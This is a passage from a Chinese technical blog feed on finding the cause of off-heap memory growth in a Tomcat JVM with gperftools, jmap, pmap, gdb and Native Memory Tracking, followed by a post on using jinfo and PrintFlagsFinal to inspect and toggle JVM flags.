InstanceKlass::oop_oop_iterate_nv</span><br><span class="line">     0.0   0.0% 100.0%    287.2  22.4% G1CollectedHeap::initialize</span><br><span class="line">     0.0   0.0% 100.0%    305.4  23.8% Universe::initialize_heap</span><br><span class="line">     0.0   0.0% 100.0%    306.3  23.9% universe_init</span><br><span class="line">     0.0   0.0% 100.0%    307.0  23.9% init_globals</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% JNI_CreateJavaVM</span><br><span class="line">     0.0   0.0% 100.0%    307.1  23.9% Threads::create_vm</span><br><span class="line">     0.0   0.0% 100.0%    307.2  23.9% JavaMain</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% ConcurrentG1RefineThread::run</span><br><span class="line">     0.0   0.0% 100.0%    326.5  25.4% RefineCardTableEntryClosure::do_card_ptr</span><br><span class="line">     0.0   0.0% 100.0%    329.8  25.7% 0x00007f63bfae74a7</span><br><span class="line">     0.0   0.0% 100.0%    348.5  27.2% DirtyCardQueueSet::apply_closure_to_completed_buffer</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% G1RemSet::refine_card</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% HeapRegion::oops_on_card_seq_iterate_careful</span><br><span class="line">     0.0   0.0% 100.0%    349.7  27.3% OtherRegionsTable::add_reference</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% os::malloc@913e80</span><br><span class="line">     0.0   0.0% 100.0%    351.0  27.4% Unsafe_AllocateMemory</span><br><span class="line">     0.0   0.0% 100.0%    408.4  31.8% java_start</span><br><span class="line">     0.0   0.0% 100.0%    562.6  43.8% BitMap::resize</span><br><span class="line">     0.0   0.0% 100.0%    598.5  46.6% ArrayAllocator::allocate</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% __clone</span><br><span class="line">     0.0   0.0% 100.0%    715.5  55.8% start_thread</span><br><span class="line">  1277.3  99.5%  99.5%   1277.3  99.5% os::malloc@9137e0</span><br></pre></td></tr></table></figure>
<p>结果代表的含义:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Analyzing Text Output</span><br><span class="line"></span><br><span class="line">Text mode has lines of output that look like this:</span><br><span class="line"></span><br><span class="line">       14   2.1%  17.2%       58   8.7% std::_Rb_tree::find</span><br><span class="line">Here is how to interpret the columns:</span><br><span class="line"></span><br><span class="line">1. Number of profiling samples in this function</span><br><span class="line">2. Percentage of profiling samples in this function</span><br><span class="line">3. Percentage of profiling samples in the functions printed so far</span><br><span class="line">4. Number of profiling samples in this function and its callees</span><br><span class="line">5. Percentage of profiling samples in this function and its callees</span><br><span class="line">6. Function name</span><br></pre></td></tr></table></figure>
<p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a>中有更加详细的说明</p>
<h4 id="pdf形式的结果"><a href="#pdf形式的结果" class="headerlink" title="pdf形式的结果"></a>pdf形式的结果</h4><p>相比文字的结果，图片形式的调用关系，更加清楚和直观。</p>
<p>命令如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install ghostscript</span><br><span class="line">sudo yum install dot</span><br><span class="line">sudo yum install graphviz -y</span><br><span class="line">sudo pprof --pdf  /home/q/java/default/bin/java _19877.19793.heap &gt; result.pdf</span><br></pre></td></tr></table></figure>
<p>结果：</p>


	<div class="row">
    <embed src="result.pdf" width="100%" height="550" type="application/pdf">
	</div>



<h2 id="可能的原因"><a href="#可能的原因" class="headerlink" title="可能的原因"></a>可能的原因</h2><p>从google perf tools的结果来看主要的堆外内存来自</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00007f52e05126a5</span><br><span class="line">0.0 (0.0%)</span><br><span class="line">of 7089.3 (82.5%)</span><br></pre></td></tr></table></figure>
<p>这个再往上就没有地址了。</p>
<h3 id="heap-占用"><a href="#heap-占用" class="headerlink" title="heap 占用"></a>heap 占用</h3><p>查看出问题机器的<code>heap</code>占用情况如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">jmap -histo:live `pgrep -f &apos;tomcat&apos;`</span><br><span class="line"></span><br><span class="line"> num     #instances         #bytes  class name</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">   1:      15272979      940261992  [C</span><br><span class="line"></span><br><span class="line">   2:      19182959      767318360  java.util.ArrayList</span><br><span class="line"></span><br><span class="line">   3:      15397474      739078752  qunar.tc.plato.zeno.util.collections.offheap.map.OffHeapHashMap</span><br><span class="line"></span><br><span class="line">   4:      13281544      637514112  java.util.concurrent.ConcurrentHashMap$Node</span><br><span class="line"></span><br><span class="line">   5:      10136730      612997544  [Ljava.lang.Object;</span><br><span class="line"></span><br><span class="line">   6:      15265576      488498432  java.lang.String</span><br><span class="line"></span><br><span class="line">   7:       4694324      413100512  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaSHotelBizInfo</span><br><span class="line"></span><br><span class="line">   8:           854      379525944  [Ljava.util.concurrent.ConcurrentHashMap$Node;</span><br><span class="line"></span><br><span class="line">   9:      15397474      369539376  qunar.tc.plato.zeno.util.collections.offheap.set.OffHeapHashSet</span><br><span class="line"></span><br><span class="line">  10:       4694324      337991328  _plato.com.qunar.hotel.price.data.center.plato.beans.shotel.IMetaContactConfig</span><br></pre></td></tr></table></figure>
<p>前面的都是去哪儿自己开发的堆外缓存占用的对象，缓存的内容也多是酒店相关的元数据。结合工具的结果，推测问题出在堆外缓存。<br>堆外缓存采用的是内存映射的方式，大量使用了<code>DirectByteBuffer</code>这种冰山对象。</p>
<h3 id="疑点"><a href="#疑点" class="headerlink" title="疑点"></a>疑点</h3><p>这个系统目前处于重构阶段，之前也是使用的堆外缓存，并没有出现问题。不过，目前在逐渐下掉堆外缓存的使用，到时候可以再看看是否出问题。</p>
<h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><h3 id="使用pmap查看进程的内存映射"><a href="#使用pmap查看进程的内存映射" class="headerlink" title="使用pmap查看进程的内存映射"></a>使用pmap查看进程的内存映射</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat pmap -x  25147 | less</span><br><span class="line"></span><br><span class="line">Address           Kbytes     RSS   Dirty Mode   Mapping</span><br><span class="line">0000000000400000       4       0       0 r-x--  java</span><br><span class="line">0000000000600000       4       4       4 rw---  java</span><br><span class="line">0000000001d3f000    1484    1224    1224 rw---    [ anon ]</span><br><span class="line">0000003e0a400000     128     112       0 r-x--  ld-2.12.so</span><br><span class="line">0000003e0a61f000       4       4       4 r----  ld-2.12.so</span><br><span class="line">0000003e0a620000       4       4       4 rw---  ld-2.12.so</span><br><span class="line">0000003e0a621000       4       4       4 rw---    [ anon ]</span><br><span class="line">0000003e0a800000       8       8       0 r-x--  libdl-2.12.so</span><br><span class="line">0000003e0a802000    2048       0       0 -----  libdl-2.12.so</span><br><span class="line">0000003e0aa02000       4       4       4 r----  libdl-2.12.so</span><br><span class="line">0000003e0aa03000       4       4       4 rw---  libdl-2.12.so</span><br><span class="line">0000003e0ac00000    1576     680       0 r-x--  libc-2.12.so</span><br><span class="line">0000003e0ad8a000    2048       0       0 -----  libc-2.12.so</span><br><span class="line">0000003e0af8a000      16      16       8 r----  libc-2.12.so</span><br><span class="line">0000003e0af8e000       4       4       4 rw---  libc-2.12.so</span><br><span class="line">0000003e0af8f000      20      20      20 rw---    [ anon ]</span><br><span class="line">0000003e0b000000      92      72       0 r-x--  libpthread-2.12.so</span><br><span class="line">0000003e0b017000    2048       0       0 -----  libpthread-2.12.so</span><br><span class="line">0000003e0b217000       4       4       4 r----  libpthread-2.12.so</span><br><span class="line">0000003e0b218000       4       4       4 rw---  libpthread-2.12.so</span><br><span class="line">0000003e0b219000      16       4       4 rw---    [ anon ]</span><br></pre></td></tr></table></figure>
<p>将内存块的内容dump成文件（慎重，会影响服务）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  gdb --batch --pid 25147 -ex &quot; dump memory /home/qisheng.li/c.dump 0x00007eefcc000000 0x00007eefcf000000&quot;</span><br></pre></td></tr></table></figure></p>
<p>查看文件的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx.h.cn2 ~]$ view c.dump</span><br></pre></td></tr></table></figure>

<p>这个dump是我在<code>2017年 09月 05日 星期二 01:34:24 CST</code>做的，但是内容看起来是tomcat respone的内容，奇怪的是内容的时间是<code>2017 17:38:18 GMT</code>，不知道是什么原因导致的，如果你知道，烦请告知。</p>
<p>直接查看堆外的内存块，无疑是最快排查堆外占用的方法，但是内存块的选择非常依赖经验， 我尝试了下，并没有找到问题。</p>
<p><code>参考5</code>中的大神，通过dump内存块，发现是netty使用的<code>directBuffer</code>分配的大量64M的内存块。</p>
<h4 id="JDK8中的-Native-Memory-Tracker"><a href="#JDK8中的-Native-Memory-Tracker" class="headerlink" title="JDK8中的 Native Memory Tracker"></a>JDK8中的 Native Memory Tracker</h4><p>在启动参数中开启：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:NativeMemoryTracking=[off | summary | detail]</span><br></pre></td></tr></table></figure></p>
<p>也可以在jvm退出的时候，打印相关的统计信息</p>
<blockquote>
<p>NMT at VM Exit<br>Use the following VM diagnostic command line option to obtain last memory usage data at VM exit when Native Memory Tracking is enabled. The level of detail is based on tracking level.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UnlockDiagnosticVMOptions -XX:+PrintNMTStatistics</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>在程序运行时可以使用<code>jcmd</code>查看内存的分配情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcmd &lt;pid&gt; VM.native_memory [summary | detail | baseline | summary.diff | detail.diff | shutdown] [scale= KB | MB | GB]</span><br></pre></td></tr></table></figure></p>
<p>输出的结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo -u tomcat jcmd `pgrep -f tomcat` VM.native_memory detail</span><br><span class="line">31549:</span><br><span class="line"></span><br><span class="line">Native Memory Tracking:</span><br><span class="line"></span><br><span class="line">Total: reserved=50215227KB, committed=49947839KB</span><br><span class="line">-                 Java Heap (reserved=46137344KB, committed=46137344KB)</span><br><span class="line">                            (mmap: reserved=46137344KB, committed=46137344KB) </span><br><span class="line"> </span><br><span class="line">-                     Class (reserved=92639KB, committed=91707KB)</span><br><span class="line">                            (classes #14958)</span><br><span class="line">                            (malloc=2527KB #50184) </span><br><span class="line">                            (mmap: reserved=90112KB, committed=89180KB) </span><br><span class="line"> </span><br><span class="line">-                    Thread (reserved=914804KB, committed=914804KB)</span><br><span class="line">                            (thread #883)</span><br><span class="line">                            (stack: reserved=906696KB, committed=906696KB)</span><br><span class="line">                            (malloc=2904KB #4435) </span><br><span class="line">                            (arena=5203KB #1764)</span><br><span class="line"> </span><br><span class="line">-                      Code (reserved=263567KB, committed=87223KB)</span><br><span class="line">                            (malloc=13967KB #19565) </span><br><span class="line">                            (mmap: reserved=249600KB, committed=73256KB) </span><br><span class="line"> </span><br><span class="line">-                        GC (reserved=1849937KB, committed=1849937KB)</span><br><span class="line">                            (malloc=105041KB #121050) </span><br><span class="line">                            (mmap: reserved=1744896KB, committed=1744896KB) </span><br><span class="line"> </span><br><span class="line">-                  Compiler (reserved=13354KB, committed=13354KB)</span><br><span class="line">                            (malloc=3061KB #3484) </span><br><span class="line">                            (arena=10292KB #13)</span><br><span class="line"> </span><br><span class="line">-                  Internal (reserved=813935KB, committed=813935KB)</span><br><span class="line">                            (malloc=813903KB #102254) </span><br><span class="line">                            (mmap: reserved=32KB, committed=32KB) </span><br><span class="line"> </span><br><span class="line">-                    Symbol (reserved=18071KB, committed=18071KB)</span><br><span class="line">                            (malloc=14355KB #138545) </span><br><span class="line">                            (arena=3716KB #1)</span><br><span class="line"> </span><br><span class="line">-    Native Memory Tracking (reserved=7274KB, committed=7274KB)</span><br><span class="line">                            (malloc=298KB #4295) </span><br><span class="line">                            (tracking overhead=6976KB)</span><br><span class="line"> </span><br><span class="line">-               Arena Chunk (reserved=14191KB, committed=14191KB)</span><br><span class="line">                            (malloc=14191KB) </span><br><span class="line"> </span><br><span class="line">-                   Unknown (reserved=90112KB, committed=0KB)</span><br><span class="line">                            (mmap: reserved=90112KB, committed=0KB) </span><br><span class="line"> </span><br><span class="line">Virtual memory map:</span><br><span class="line"> </span><br><span class="line">[0x00007ef481693000 - 0x00007ef481794000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef481794000 - 0x00007ef481895000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef48224d000 - 0x00007ef48244d000] reserved 2048KB for Class from</span><br><span class="line">    [0x00007f0486593c66] ReservedSpace::initialize(unsigned long, unsigned long, bool, char*, unsigned long, bool)+0x256</span><br><span class="line">    [0x00007f0486593d0b] ReservedSpace::ReservedSpace(unsigned long, unsigned long, bool, char*, unsigned long)+0x1b</span><br><span class="line">    [0x00007f0486379cda] VirtualSpaceNode::VirtualSpaceNode(unsigned long)+0x17a</span><br><span class="line">    [0x00007f048637a59a] VirtualSpaceList::create_new_virtual_space(unsigned long)+0x5a</span><br><span class="line"></span><br><span class="line">	[0x00007ef48228d000 - 0x00007ef4823cd000] committed 1280KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a750] VirtualSpaceList::expand_by(unsigned long, unsigned long)+0xf0</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line"></span><br><span class="line">	[0x00007ef48224d000 - 0x00007ef48228d000] committed 256KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line">            [0x00007f048637c432] SpaceManager::grow_and_allocate(unsigned long)+0x2d2</span><br></pre></td></tr></table></figure>
<img src="/2017/12/02/google-perf-tools/memory-mapping.jpg">
<p>如果通过上述的映射关系能直接找到系统的<code>StringTable</code>等对应的分区，dump内存下来应该能很快的发现问题，不知道行不行得通。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://lovestblog.cn/blog/2015/08/21/rssxmx/" rel="external nofollow noopener noreferrer" target="_blank">进程物理内存远大于Xmx的问题分析 - 你假笨</a></p>
</li>
<li><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVM源码分析之堆外内存完全解读 - 你假笨</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/directbytebuffer.html" rel="external nofollow noopener noreferrer" target="_blank">Netty之Java堆外内存扫盲贴 | 江南白衣</a></p>
</li>
<li><p><a href="http://blog.csdn.net/jicahoo/article/details/50933469" rel="external nofollow noopener noreferrer" target="_blank">Java内存之本地内存分析神器： NMT 和 pmap - CSDN博客</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;mid=2650518452&amp;idx=1&amp;sn=c196bba265f888ed086b7059ca5d3fd2&amp;chksm=8780b470b0f73d66c79b7df96435d48caa8c49a9a6b696e543c0df24e3356202ccde69f2f671&amp;mpshare=1&amp;scene=1&amp;srcid=0831YG589PwShEgNLJ8CKQOp#rd" rel="external nofollow noopener noreferrer" target="_blank">Java堆外内存排查小结</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/nmt-8.html" rel="external nofollow noopener noreferrer" target="_blank">Native Memory Tracking</a></p>
</li>
<li><p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a></p>
</li>
<li><p><a href="http://whosemario.github.io/2016/09/27/google-preftool-1/index.html" rel="external nofollow noopener noreferrer" target="_blank">Google Perftools Mac OS 安装与使用 | Whosemario的家</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> google-perf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jinfo使用]]></title>
      <url>http://qsli.github.io/2017/11/26/jinfo/</url>
      <content type="html"><![CDATA[<h2 id="查看最终生效的flag"><a href="#查看最终生效的flag" class="headerlink" title="查看最终生效的flag"></a>查看最终生效的flag</h2><p><code>sudo -u tomcat jinfo pid</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Attaching to process ID 30350, please wait...</span><br><span class="line">Debugger attached successfully.</span><br><span class="line">Server compiler detected.</span><br><span class="line">JVM version is 24.45-b08</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">package.access = sun.,org.apache.catalina.,org.apache.coyote.,org.apache.tomcat.,org.apache.jasper.,sun.beans.</span><br><span class="line">sun.cpu.isalist = </span><br><span class="line"></span><br><span class="line">VM Flags:</span><br><span class="line"></span><br><span class="line">-Djava.util.logging.config.file=/tomcat/www/application/conf/logging.properties -Xms6g -Xmx6g -Xmn4g -XX:PermSize=256m -XX:MaxPermSize=256M ... -Djava.io.tmpdir=/tomcat/www/application/temp</span><br></pre></td></tr></table></figure>
<h3 id="java-XX-PrintFlagsFinal"><a href="#java-XX-PrintFlagsFinal" class="headerlink" title="java -XX:+PrintFlagsFinal"></a>java -XX:+PrintFlagsFinal</h3><p>使用<code>-version</code>可以查看java支持的开关</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -XX:+PrintFlagsFinal -version</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚6…) java -XX:+PrintFlagsFinal -version</span><br><span class="line">[Global flags]</span><br><span class="line">    uintx AdaptiveSizeDecrementScaleFactor          = 4                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizeMajorGCDecayTimeScale         = 10                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePausePolicy                   = 0                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyCollectionCostMargin    = 50                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyInitializingSteps       = 20                                  &#123;product&#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    uintx YoungGenerationSizeSupplementDecay        = 8                                   &#123;product&#125;</span><br><span class="line">    uintx YoungPLABSize                             = 4096                                &#123;product&#125;</span><br><span class="line">     bool ZeroTLAB                                  = false                               &#123;product&#125;</span><br><span class="line">     intx hashCode                                  = 5                                   &#123;product&#125;</span><br><span class="line">java version &quot;1.8.0_112&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_112-b15)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.112-b15, mixed mode)</span><br></pre></td></tr></table></figure>
<p>但是<code>白衣大侠</code>说，<code>-version</code>的结果可能不准确，最好实际跑一下。</p>
<blockquote>
<p>经常以类似下面的语句去查看参数，偷懒不起应用，用-version代替。有些参数设置后会影响其他参数，所以查看时也把它带上。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -server -Xmx1024m -Xms1024m -XX:+UseConcMarkSweepGC -XX:+PrintFlagsFinal -version| grep ParallelGCThreads</span><br></pre></td></tr></table></figure>
<h2 id="动态打开jvm的开关"><a href="#动态打开jvm的开关" class="headerlink" title="动态打开jvm的开关"></a>动态打开jvm的开关</h2><p>jinfo可以动态的改变jvm的flag， 而不必重启服务器。虽然只对一些特定的flag有效，但是有的时候也很有用。</p>
<p>支持动态开启和关闭的的flag，可以通过下面的命令查看。</p>
<p><code>java -XX:+PrintFlagsFinal -version | grep managed</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qsli.github.com (hexo|✚6…) java -XX:+PrintFlagsInitial | grep manageable</span><br><span class="line">     intx CMSAbortablePrecleanWaitMillis            = 100                                 &#123;manageable&#125;</span><br><span class="line">     intx CMSTriggerInterval                        = -1                                  &#123;manageable&#125;</span><br><span class="line">     intx CMSWaitDuration                           = 2000                                &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpAfterFullGC                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpBeforeFullGC                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpOnOutOfMemoryError                = false                               &#123;manageable&#125;</span><br><span class="line">    ccstr HeapDumpPath                              =                                     &#123;manageable&#125;</span><br><span class="line">    uintx MaxHeapFreeRatio                          = 70                                  &#123;manageable&#125;</span><br><span class="line">    uintx MinHeapFreeRatio                          = 40                                  &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogram                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramAfterFullGC            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramBeforeFullGC           = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintConcurrentLocks                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGC                                   = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDateStamps                         = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDetails                            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCID                                 = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCTimeStamps                         = false                               &#123;manageable&#125;</span><br></pre></td></tr></table></figure>
<p>用<code>JConsole</code>打开，可以看到相应的<code>MXBean</code>节点:</p>
<img src="/2017/11/26/jinfo/jinfo.png">
<p>使用代码也可以获取对应的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> afei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2017年07月25日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiagnosticOptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HotSpotDiagnostic mxBean = <span class="keyword">new</span> HotSpotDiagnostic();</span><br><span class="line">        List&lt;VMOption&gt; diagnosticVMOptions = mxBean.getDiagnosticOptions();</span><br><span class="line">        <span class="keyword">for</span> (VMOption vmOption:diagnosticVMOptions)&#123;</span><br><span class="line">            System.out.println(vmOption.getName() + <span class="string">" = "</span> + vmOption.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>代码拷贝自参考1</p>
</blockquote>
<p>然后就可以使用下面的命令，打开或者关闭相应的开关</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-flag [+|-]name</span><br><span class="line">            enables or disables the given boolean command line flag.</span><br></pre></td></tr></table></figure>
<p>比如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat jinfo -flag  -PrintGC `pgrep -f tomcat`</span><br><span class="line">sudo -u tomcat jinfo -flag  +PrintGC `pgrep -f tomcat`</span><br></pre></td></tr></table></figure>
